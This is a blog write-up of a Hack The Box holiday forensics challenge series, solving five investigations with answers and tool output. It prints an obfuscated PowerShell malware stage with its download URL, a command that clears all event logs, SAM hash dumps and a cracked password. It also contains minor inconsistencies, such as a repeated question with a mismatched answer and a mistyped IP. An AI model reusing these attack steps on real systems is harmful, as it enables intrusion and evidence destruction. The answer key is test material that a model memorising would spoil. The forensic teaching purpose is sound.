---
title: Operation Tinsel Trace 2023 - Sherlocks
time: 2023-12-26 12:00:00
categories: [sherlocks]
tags: [operation,htb]
image: /assets/posts/optinseltrace_sherlock/icon.jpg
---

Operation Tinsel Trace consists of five exclusive Sherlocks following the compromise of Father Christmas’s festive operations by a formidable, infamous adversary: The Grinch! As the festive season approaches, the North Pole is buzzing with activity. But not all is merry in Santa's workshop as a series of sophisticated cyber attacks threaten to disrupt Christmas. In Operation Tinsel Trace, you will impersonate Santa's chosen elf to lead the cybersecurity response team and unravel the tangled tinsel of these incidents. It all starts with an elf named "Elfin" acting rather suspiciously lately. He's been working at odd hours and seems to be bypassing some of Santa's security protocols. The Grinch got a little bit too tipsy on egg nog and made mention of an insider elf! You will start by running an audit of Elfin’s workstation and email communications. Operation Tinsel Trace will lead you inside the technology of Santa’s tech, configuration, logs, and servers until, at a certain point, everything seems to be doomed. Will you be able to recover from this advanced attack? https://www.hackthebox.com/blog/christmas-event-2023

## OpTinselTrace-1
An elf named "Elfin" has been acting rather suspiciously lately. He's been working at odd hours and seems to be bypassing some of Santa's security protocols. Santa's network of intelligence elves has told Santa that the Grinch got a little bit too tipsy on egg nog and made mention of an insider elf! Santa is very busy with his naughty and nice list, so he’s put you in charge of figuring this one out. Please audit Elfin’s workstation and email communications.

### Task 1 
Question: What is the name of the email client that Elfin is using?

Answer: `eM client`

We are given a compromised machine to investigate. Since the question is asking for Elfin's email client, it is probably a program downloaded in his machine located in the `Appdata` folder. In the Roaming folder, `eM client` can be found.

![op1](/assets/posts/optinseltrace_sherlock/op1.png)

### Task 2  
Question: What is the email the threat is using?

Answer: `definitelynotthegrinch@gmail.com`

One easy way to solve this whole Sherlock is to just utilize `eM client` and import the configuration files to the program. Using the email client, we can see the `Grinch` sending an email to Elfin.

![op2](/assets/posts/optinseltrace_sherlock/op2.png)

### Task 3 
Question: When does the threat actor reach out to Elfin?

Answer: `2023-11-27 17:27:26`

Inside the email client, just open up the replies section (make sure the time is converted to UTC).

![op3](/assets/posts/optinseltrace_sherlock/op3.png)

### Task 4 
Question: What is the name of Elfins boss?

Answer: `elfuttin bigelf`

Just look through the emails received by Elfin.

![op4](/assets/posts/optinseltrace_sherlock/op4.png)

### Task 5 
Question: What is the title of the email in which Elfin first mentions his access to Santas special files?

Answer: `Re: work`

Just look through the emails received by Elfin and focus on the subject line.

![op5](/assets/posts/optinseltrace_sherlock/op5.png)

### Task 6 
Question: The threat actor changes their name, what is the new name + the date of the first email Elfin receives with it?

Answer: `wendy elflower, 2023-11-28 10:00:21`

Just look through the emails for suspicious users and open up the replies. The threat actor can be identified as `wendy elflower`.

![op6](/assets/posts/optinseltrace_sherlock/op6.png)

### Task 7
Question: What is the name of the bar that Elfin offers to meet the threat actor at?

Answer: `SnowGlobe`

Just look through the emails sent to `wendy elflower`.

![op7](/assets/posts/optinseltrace_sherlock/op7.png)

### Task 8
Question: When does Elfin offer to send the secret files to the actor?

Answer: `2023-11-28 16:56:13`

Similar to Task 7, just look through the emails sent to `wendy elflower` (make sure the time is converted to UTC).

![op8](/assets/posts/optinseltrace_sherlock/op8.png)

### Task 9
Question: What is the search string for the first suspicious google search from Elfin? (Format: string)

Answer: `how to get around work security`

Since the question mentioned `Google search`, I extracted several Chrome artifacts located in `\optinseltrace1\TriageData\C\users\Elfin\Appdata\Local\Google\Chrome\User Data\Default\` and analyzed them. There were several suspicious search results found in the `History` artifact.

![op9](/assets/posts/optinseltrace_sherlock/op9.png)

### Task 10
Question: What is the name of the author who wrote the article from the CIA field manual?

Answer: `Joost Minnaar`

Similar to Task 9, the article can be found in a search result.

![op10](/assets/posts/optinseltrace_sherlock/op10.png)

![op10.1](/assets/posts/optinseltrace_sherlock/op10.1.png)

### Task 11
Question: What is the name of Santas secret file that Elfin sent to the actor?

Answer: `santa_deliveries.zip`

The secret file can be found in Elfin's machine located in `\optinseltrace1\TriageData\C\users\Elfin\Appdata\Roaming\top-secret\`.

### Task 12
Question: According to the filesystem, what is the exact CreationTime of the secret file on Elfins host?

Answer: `2023-11-28 17:01:29`

One way to find the exact creation time is to analyze the MFT. The MFT can be parsed using MFTEcmd and analyzed using Timeline Explorer.

![op11](/assets/posts/optinseltrace_sherlock/op11.png)

### Task 13
Question: What is the full directory name that Elfin stored the file in?

Answer: `C:\users\Elfin\Appdata\Roaming\top-secret`

Similar to Task 11.

### Task 14
Question: What is the name of the bar that Elfin offers to meet the threat actor at?

Answer: `Greece`

Suspicious Google Chrome search results about flying to Greece from North Pole can be found in the `History` artifact analyzed previously.

![op12](/assets/posts/optinseltrace_sherlock/op12.png)

### Task 15
Question: What is the email address of the apology letter the user (elfin) wrote out but didn’t send?

Answer: `Santa.claus@gmail.com`

Check the Drafts section in the email client.

![op13](/assets/posts/optinseltrace_sherlock/op13.png)

### Task 16
Question: The head elf PixelPeppermint has requested any passwords of Elfins to assist in the investigation down the line. What’s the windows password of Elfin’s host?

Answer: `Santaknowskungfu`

Using Impacket, the SAM file located in `\optinseltrace1\TriageData\C\Windows\system32\config\` can be extracted to crack passwords. The password obtained was `Santaknowskungfu`

```
└─$ python3 secretsdump.py -sam /home/kali/Desktop/TriageData/C/Windows/system32/config/SAM -system /home/kali/Desktop/TriageData/C/Windows/system32/config/SYSTEM LOCAL
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Target system bootKey: 0x1679d0a0bee2b5804325deeddb0ec9fe
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:95199bba413194e567908de6220d677e:::
Elfin:1001:aad3b435b51404eeaad3b435b51404ee:529848fe56902d9595be4a608f9fbe89:::
[*] Cleaning up... 
```

![op14](/assets/posts/optinseltrace_sherlock/op14.png)

## OpTinselTrace-2
It seems our precious technology has been leaked to the threat actor. Our head Elf, PixelPepermint, seems to think that there were some hard-coded sensitive URLs within the technology sent. 
Please audit our Sparky Cloud logs and confirm if anything was stolen! PS - Santa likes his answers in UTC...

### Task 1 
Question: What is the MD5 sum of the binary the Threat Actor found the S3 bucket location in?

Answer: `62d5c1f1f9020c98f97d8085b9456b05`

Check the MD5 sum of the suspicious file in OpTinsel-1.

```
└─$ md5sum santa_deliveries
62d5c1f1f9020c98f97d8085b9456b05  santa_deliveries
```

### Task 2  
Question: What time did the Threat Actor begin their automated retrieval of the contents of our exposed S3 bucket?

Answer: `2023-11-29 08:24:07`

We are given Cloudtrail logs to investigate. You can either use `jq` or `SIEM` to analyze these logs, but since I was new at Cloudtrail forensics, I utilized Splunk SIEM since I wanted to learn Splunk too. The first thing was to perform enumeratation to identify the handles, IP addresses and bucket names.

![aws1](/assets/posts/optinseltrace_sherlock/aws1.png)

![aws2](/assets/posts/optinseltrace_sherlock/aws2.png)

![aws3](/assets/posts/optinseltrace_sherlock/aws3.png)

Notice how `86.5.206.121` and `191.101.31.57` had a suspiciously high count of events. The AWS server is most likely `86.5.206.121` while the threat actor is most likely `191.101.31.57`. Filtering by the event `GetObject` and `191.101.31.57`, the specific time can be obtained after sorting the results.

![aws4](/assets/posts/optinseltrace_sherlock/aws4.png)

### Task 3 
Question: What time did the Threat Actor complete their automated retrieval of the contents of our exposed S3 bucket?

Answer: `2023-11-29 08:24:16`

Similar to Task 2, just sort in descending order.

![aws5](/assets/posts/optinseltrace_sherlock/aws5.png)

### Task 4 
Question: Based on the Threat Actor's user agent - what scripting language did the TA likely utilise to retrieve the files?

Answer: `python`

Checking the logs from `191.101.31.57`, it seems that the user agent was `Python`.

![aws5](/assets/posts/optinseltrace_sherlock/aws5.png)

### Task 5 
Question: Which file did the Threat Actor locate some hard coded credentials within?

Answer: `claus.py`

By checking the binary file, we can find the URL `https://papa-noel.s3.eu-west-3.amazonaws.com/`. In the AWS bucket, we find a commit message mentioning that `claus.py` was modified to remove credentials. This suggests that the hidden credentials were indeed stored in the python script.

![aws6](/assets/posts/optinseltrace_sherlock/aws6.png)

```
# Please enter the commit message for your changes. Lines starting
# with '#' will be ignored, and an empty message aborts the commit.
#
# Author:    Author Name <bytesparkle@papanoel.co.uk>
#
# On branch master
# Changes to be committed:
#	modified:   claus.py
#
Removed the sparkly creds from the script! How silly of me! Sometimes I'm about as useful as a screen saver on Santa's Sleigh!!!!!!
```

Downloading `claus.py`, the credentials can be found within the file.

![aws7](/assets/posts/optinseltrace_sherlock/aws7.png)

### Task 6 
Question: Please detail all confirmed malicious IP addresses. (Ascending Order)

Answer: `45.133.193.41, 191.101.31.57`

We know one of the IP address `192.101.31.57` from Task 2 was malicious. The other malicious IP address can be traced by filtering events on the bucket `north-pole-private` as that was the bucket leaked by the attacker previously. Filtering it, we find two events with `45.133.193.41` in both of them.

![aws8](/assets/posts/optinseltrace_sherlock/aws8.png)

### Task 7
Question: We are extremely concerned the TA managed to compromise our private S3 bucket, which contains an important VPN file. Please confirm the name of this VPN file and the time it was retrieved by the TA.

Answer: `bytesparkle.ovpn, 2023-11-29 10:16:53`

Analyzing the events from `45.133.193.41`, the VPN file `bytesparkle.ovpn` can be found on the second event being requested by the threat actor.

![aws9](/assets/posts/optinseltrace_sherlock/aws9.png)

### Task 8
Question: Please confirm the username of the compromised AWS account?

Answer: `elfadmin`

Analyzing the events from `45.133.193.41`, specifically the user agent field, the username can be obtained as `elfadmin`.

![aws10](/assets/posts/optinseltrace_sherlock/aws10.png)

### Task 9
Question: Based on the analysis completed Santa Claus has asked for some advice. What is the ARN of the S3 Bucket that requires locking down?

Answer: `arn:aws:s3:::papa-noel`

We know the compromised account was `192.101.31.57`. Filtering the IP address, we can find the ARN of the S3 Bucket to be `arn:aws:s3:::papa-noel`.

![aws11](/assets/posts/optinseltrace_sherlock/aws11.png)

## OpTinselTrace-3
Oh no! Our IT admin is a bit of a cotton-headed ninny-muggins, ByteSparkle left his VPN configuration file in our fancy private S3 location! The nasty attackers may have gained access to our internal network. We think they compromised one of our TinkerTech workstations. Our security team has managed to grab you a memory dump - please analyse it and answer the questions! Santa is waiting…

### Task 1 
Question: What is the name of the file that is likely copied from the shared folder (including the file extension)?

Answer: `present_for_santa.zip`

We are given a memory dump to investigate. Reading the scenario, I tried scanning the files in the memory dump with grep santa. A suspicious zip file can be found in the Desktop.
```
python3 vol.py -f /mnt/hgfs/shared/HTB/Optinseltrace/optinseltrace3/santaclaus.bin windows.filescan | grep "santa"
```

![vol1](/assets/posts/optinseltrace_sherlock/vol1.png)

### Task 2 
Question: What is the file name used to trigger the attack (including the file extension)?

Answer: `click_for_present.lnk`

Inside the zip file, a lnk file and a VBS script can be found.
```
python3 vol.py -f /mnt/hgfs/shared/HTB/Optinseltrace/optinseltrace3/santaclaus.bin windows.dumpfiles --virtaddr 0xa48df8fb42a0
```

![vol2](/assets/posts/optinseltrace_sherlock/vol2.png)

### Task 3 
Question: What is the name of the file executed by click_for_present.lnk (including the file extension)?

Answer: `present.vbs`

Check the metadata of the lnk file.

![vol3](/assets/posts/optinseltrace_sherlock/vol3.png)

### Task 4 
Question: What is the name of the program used by the vbs script to execute the next stage?

Answer: `powershell.exe`

Using [VirusTotal](https://www.virustotal.com/gui/file/78ba1ea3ac992391010f23b346eedee69c383bc3fd2d3a125ede6cba3ce77243/behavior), we can easily analyze the VBS script and find a powershell command inside it.

```powershell
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe Function WrapPresent ($Ensproglig){$Nringsvirksomhedernes = $Ensproglig.Length-1; For ($Smiths211=6; $Smiths211 -lt $Nringsvirksomhedernes){$Malice=$Malice+$Ensproglig.Substring($Smiths211, 1);$Smiths211+=7;}$Malice;};$present=WrapPresent 'Once uhon a ttme, intthe whpmsical:town o/ Holid/y Holl7w, the7e live. two l7gendar4 figur.s know1 far a9d wide8 the G.inch a5d Sant2 Claus/ They desidedeon oppssite stdes ofrthe toon, eacy with _heir ocn uniqhe charrcterisiics thst defited them. The arinch,sa soli/ary creature,vdwellei in a lave at_p Mounp Crumprt. Wite his gseen fue and anheart teeming.y two jizes tpo smalg, he h';$gluhwein=WrapPresent 'd a peichant eor misxhief a';. ($gluhwein) (WrapPresent 'd a di$dain fpr anyteing fertive. se despesed thn joyout celebLationsothat echoed tarough the towi, espeoially nuring =he win$er holedays. nn the vther s:de of tolidayeHollowm nestlpd in ac');$File=WrapPresent 'cozy w\rkshoppat therNorth eole, lsved the jollynand betevolen. SantaeClaus.xWith hes roun';. ($gluhwein) (WrapPresent ' belly$ rosy pheeks,eand a reart bsimmingewith knndnesst he spLnt hisodays ccaftingatoys ftr chiliren around thn world=and sp$eadingpcheer eherever he west. Yeae afternyear, ts the Lolidayoseasoncapproaahed, tte townifolk eogerly nrepare+ for f$stivitFes, adirning lhe streets wih');. ($gluhwein) (WrapPresent 'h ligh.s, set ing up$decoragions, lnd sinuing johful tuwes. Whele Sania businy prep red hi( sleigN and ceecked wis lis- twiceO the Gbinch sjethed en his cave, itritate by thn merrieent thtt fill.d the wir. One fatefbl wintcr, a plrticulirly ice chillnswept through)Holida. HolloD, causong chaws and nisruptlng theoholidaa spirid. The Fnowstoims grel wildee, and (he tow$sfolk ptrugglrd to keep thesr festeve tranitionstalive.,Childr$n werepdisappeinted rs the srospece of a noyous telebraLion diomed. Wctnessiag the towns distresso Santanknew h) had t; do soe');. ($gluhwein) (WrapPresent 'ethingSto restore tha holidry cheet. With-a twinPle in ris eyeoand a ceart fell of sope, hs decid d to p$y a vipit to ehe Grirch, hosing toewarm hns heart and bLing baok the cpirit af the teason.iGuidedoby hisnunyiel;i');
```

### Task 5 
Question: What is the name of the function used for the powershell script obfuscation?

Answer: `WrapPresent`

Similar to Task 4, the powershell function can be obtain as `WrapPresent()`.

### Task 6
Question: What is the URL that the next stage was downloaded from?

Answer: `http://77.74.198.52/destroy_christmas/evil_present.jpg`

Using [VirusTotal](https://www.virustotal.com/gui/file/78ba1ea3ac992391010f23b346eedee69c383bc3fd2d3a125ede6cba3ce77243/behavior), we can easily find the HTTP request.

![vol4](/assets/posts/optinseltrace_sherlock/vol4.png)

### Task 7
Question: What is the IP and port that the executable downloaded the shellcode from (IP:Port)?

Answer: `77.74.198.52:445`

For some reason, this question requires us to analyze the zip file on [VirusTotal](https://www.virustotal.com/gui/file/31ef280a565a53f1432a1292f3d3850066c0ae8af18a4824e59ac6be3aa6ea9c/detection) instead, the IP address and port can be found.

![vol5](/assets/posts/optinseltrace_sherlock/vol5.png)

### Task 8
Question: What is the process ID of the remote process that the shellcode was injected into?

Answer: `724`

Since we know the IP address associated with the VBS script, we can use netstat to discover its process.
```
python3 vol.py -f /mnt/hgfs/shared/HTB/Optinseltrace/optinseltrace3/santaclaus.bin windows.netstat
```

![vol6](/assets/posts/optinseltrace_sherlock/vol6.png)

### Task 9
Question: After the attacker established a Command & Control connection, what command did they use to clear all event logs?

Answer: `Get-EventLog -List | ForEach-Object { Clear-EventLog -LogName $_.Log }`

At this point, I was stuck and required hints from @tmechen on HTB Discord. He gave a hint on evtx logs and hence I dumped the `Windows Powershell.evtx` file since the script runs on powershell. Task 9-13 can be solved with the evtx log.

```
python3 vol.py -f /mnt/hgfs/shared/HTB/Optinseltrace/optinseltrace3/santaclaus.bin windows.filescan | grep "evtx"
```

![vol7](/assets/posts/optinseltrace_sherlock/vol7.png)

![vol8](/assets/posts/optinseltrace_sherlock/vol8.png)

### Task 10
Question: What is the full path of the folder that was excluded from defender?

Answer: `C:\users\public`

![vol9](/assets/posts/optinseltrace_sherlock/vol9.png)

### Task 11
Question: What is the original name of the file that was ingressed to the victim?

Answer: `procdump.exe`

Checking the event logs, we can find the malicious file as `PresentForNaughtyChild.exe`

![vol10](/assets/posts/optinseltrace_sherlock/vol10.png)

Since the question wants the original name, the PresentForNaughtyChild.exe file has to be extracted via Volatility first before analyzing it on [VirusTotal](https://www.virustotal.com/gui/file/337c24c2e6016a9bdca30f2820df9c1dae7b827ad73c93a14e1dc78906b63890).

![vol11](/assets/posts/optinseltrace_sherlock/vol11.png)

### Task 12
Question: What is the name of the process targeted by procdump.exe?

Answer: `lsass.exe`

The powershell command shows the targeted process.

![vol10](/assets/posts/optinseltrace_sherlock/vol10.png)

## OpTinselTrace-4
Printers are important in Santa’s workshops, but we haven’t really tried to secure them! The Grinch and his team of elite hackers may try and use this against us! Please investigate using the packet capture provided! The printer server IP Address is 192.168.68.128

### Task 1 
Question: The performance of the network printer server has become sluggish, causing interruptions in the workflow at the North Pole workshop. Santa has directed us to generate a support request and examine the network data to pinpoint the source of the issue. He suspects that the Grinch and his group may be involved in this situation. Could you verify if there is an IP Address that is sending an excessive amount of traffic to the printer server?

Answer: `172.17.79.133`

We are given a pcap to investigate. The question mentioned the printer server's IP address is `192.168.68.128`. So the first step is to find out which IP address sent the most requests to this IP address which is `172.17.79.133`.

![wire1](/assets/posts/optinseltrace_sherlock/wire1.png)

### Task 2 
Question: Bytesparkle being the technical Lead, found traces of port scanning from the same IP identified in previous attack. Which port was then targeted for initial compromise of the printer?

Answer: `9100`

By filtering the malicious IP address, we can see the IP targetting a specific port using TCP.

![wire2](/assets/posts/optinseltrace_sherlock/wire2.png)

### Task 3 
Question: What is the full name of printer running on the server?

Answer: `Northpole HP LaserJet 4200n`

After filtering, the TCP streams can be followed to read its content. At TCP stream 28, we can find readable strings of text.

![wire3](/assets/posts/optinseltrace_sherlock/wire3.png)

### Task 4 
Question: Grinch intercepted a list of nice and naughty children created by Santa. What was name of the second child on the nice list?

Answer: `Douglas Price`

Similar to Task 3, just analyze the contents in TCP stream 28.

![wire4](/assets/posts/optinseltrace_sherlock/wire4.png)

### Task 5
Question: The Grinch obtained a print job instruction file intended for a printer used by an employee named Elfin. It appears that Santa and the North Pole management team have made the decision to dismiss Elfin. Could you please provide the word for word rationale behind the decision to terminate Elfin's employment?

Answer: `The addressed employee is confirmed to be working with grinch and team. According to Clause 69 , This calls for an immediate expulsion.`

Similar to Task 3 and 4, just analyze the contents in TCP stream 28.

![wire5](/assets/posts/optinseltrace_sherlock/wire5.png)

### Task 6 
Question: What was the name of the scheduled print job?

Answer: `MerryChristmas+BonusAnnouncment`

Several strings of text can be found on TCP stream 46.

![wire6](/assets/posts/optinseltrace_sherlock/wire6.png)

### Task 7
Question: Amidst our ongoing analysis of the current packet capture, the situation has escalated alarmingly. Our security system has detected signs of post-exploitation activities on a highly critical server, which was supposed to be secure with SSH key-only access. This development has raised serious concerns within the security team. While Bytesparkle is investigating the breach, he speculated that this security incident might be connected to the earlier printer issue. Could you determine and provide the complete path of the file on the printer server that enabled the Grinch to laterally move to this critical server?

Answer: `/Administration/securitykeys/ssh_systems/id_rsa`

Similar to Task 6, just analyze the contents in TCP stream 46.

![wire7](/assets/posts/optinseltrace_sherlock/wire7.png)

### Task 8
Question: What is size of this file in bytes?

Answer: `1914`

Similar to Task 7, the file size can be found.

![wire7](/assets/posts/optinseltrace_sherlock/wire7.png)

### Task 9
Question: What was the hostname of the other compromised critical server?

Answer: `christmas.gifts`

Similar to Task 7, the hostname can be found in the comments.
```
#This is a backup key for christmas.gifts server. Bytesparkle recommended me this since in christmas days everything gets mixed up in all the chaos and we can lose our access keys to the server just like we did back in 2022 christmas.
```

### Task 10
Question: When did the Grinch attempt to delete a file from the printer? (UTC)

Answer: `2023-12-08 12:18:14`

Analyzing TCP stream 71, the arrival time of the packet can be found.

![wire8](/assets/posts/optinseltrace_sherlock/wire8.png)

![wire9](/assets/posts/optinseltrace_sherlock/wire9.png)

## OpTinselTrace-5
You'll notice a lot of our critical server infrastructure was recently transferred from the domain of our MSSP - Forela.local over to Northpole.local. We actually managed to purchase some second hand servers from the MSSP who have confirmed they are as secure as Christmas is! It seems not as we believe christmas is doomed and the attackers seemed to have the stealth of a clattering sleigh bell, or they didn’t want to hide at all!!!!!! We have found nasty notes from the Grinch on all of our TinkerTech workstations and servers! Christmas seems doomed. Please help us recover from whoever committed this naughty attack!

### Task 1 
Question: Which CVE did the Threat Actor (TA) initially exploit to gain access to DC01?

Answer: `CVE-2020-1472`

We are given a compromised machine to investigate again. I used Hayabusa to parse and analyze the event logs to get a better understanding of how the attack went down.

![hay1](/assets/posts/optinseltrace_sherlock/hay1.png)

The most critical events happened on 13/12/2022. So I used Timeline Explorer to analyze the csv file from Hayabusa and found a suspicious logon from an unknown user `192.168.68.200` using an exploit called `Zerologon`.

![hay2](/assets/posts/optinseltrace_sherlock/hay2.png)

Scrolling further down, the unknown user seems to perform `Mimikatz DC Sync` multiple times. So I googled it to confirm if it's related to Zerologon and it does!

![hay3](/assets/posts/optinseltrace_sherlock/hay3.png)

![hay4](/assets/posts/optinseltrace_sherlock/hay4.png)

### Task 2 
Question: What time did the TA initially exploit the CVE? (UTC)

Answer: `2023-12-13 09:24:23`

Reading this [blog](https://0xbandar.medium.com/detecting-the-cve-2020-1472-zerologon-attacks-6f6ec0730a9e) about the CVE, it mentioned an easy way to detect the exploit using `Security.evtx`. Since Hayabusa mentioned the IoC was sometime around 13/12/2022, the initial exploit time can be obtained.

![hay5](/assets/posts/optinseltrace_sherlock/hay5.png)

### Task 3
Question: What is the name of the executable related to the unusual service installed on the system around the time of the CVE exploitation?

Answer: `hAvbdksT.exe`

The executable related to the `vulnerable_to_zerologon` service can be easily found in the `System.evtx` by filtering the time and eventID.

![hay6](/assets/posts/optinseltrace_sherlock/hay6.png)

### Task 4 
Question: What date & time was the unusual service start?

Answer: `2023-12-13 09:24:24`

Similar to Task 3, just look for `vulnerable_to_zerologon` service starting.

![hay7](/assets/posts/optinseltrace_sherlock/hay7.png)

### Task 5 
Question: What was the TA's IP address within our internal network?

Answer: `192.168.68.200`

Since we know the attack occured around `2023-12-13 09:24:23`, we can filter the `Security.evtx` with eventID `4624` to find suspicious logons. At `2023-12-13 09:24:21`, an anonymous logon was made by `192.168.68.200`.

![hay8](/assets/posts/optinseltrace_sherlock/hay8.png)

### Task 6 
Question: Please list all user accounts the TA utilised during their access. (Ascending order)

Answer: `Administrator, Bytesparkle`

Similar to Task 5, filter the `Security.evtx` by eventID `4624` and `192.168.68.200` to ease the search.

![hay9](/assets/posts/optinseltrace_sherlock/hay9.png)

![hay10](/assets/posts/optinseltrace_sherlock/hay10.png)

The Hayabusa results also show the compromised user accounts.

![hay11](/assets/posts/optinseltrace_sherlock/hay11.png)

### Task 7 
Question: What was the name of the scheduled task created by the TA?

Answer: `svc_vnc`

Just look for the `Microsoft-Windows-TaskScheduler%254Operational.evtx` file and filter by eventID `106`. Two schedule tasks was created and one of them was suspicious.

![hay12](/assets/posts/optinseltrace_sherlock/hay12.png)

### Task 8 
Question: Santa's memory is a little bad recently! He tends to write a lot of stuff down, but all our critical files have been encrypted! Which creature is Santa's new sleigh design planning to use?

Answer: `Unicorn`

Initially, we were given several encrypted files and the encryption program `splunk_svc.dll`. Using Ghidra, I managed to find the encryption function within the program and the encryption method was discovered to be a simple XOR with the key `EncryptingC4Fun!`. So we can use CyberChef to decrypt the files easily and discover Santa's plan.

![hay13](/assets/posts/optinseltrace_sherlock/hay13.png)

![hay14](/assets/posts/optinseltrace_sherlock/hay14.png)

### Task 9 
Question: Please confirm the process ID of the process that encrypted our files.

Answer: `5828`

Using EVTXCmd, we can filter by the file extension of encrypted files (.xmax) and discover that they were stored in the `Microsoft-Windows-UAC-FileVirtualization/Operational` channel. Hence, we can analyze the `Microsoft-Windows-UAC-FileVirtualization/Operational.evtx` file to obtain the process ID.

![hay15](/assets/posts/optinseltrace_sherlock/hay15.png)

![hay16](/assets/posts/optinseltrace_sherlock/hay16.png)

## Ranking
![rank1](/assets/posts/optinseltrace_sherlock/rank1.webp)
![rank2](/assets/posts/optinseltrace_sherlock/rank2.webp)
![rank3](/assets/posts/optinseltrace_sherlock/rank3.webp)
![rank4](/assets/posts/optinseltrace_sherlock/rank4.webp)
![rank5](/assets/posts/optinseltrace_sherlock/rank5.webp)
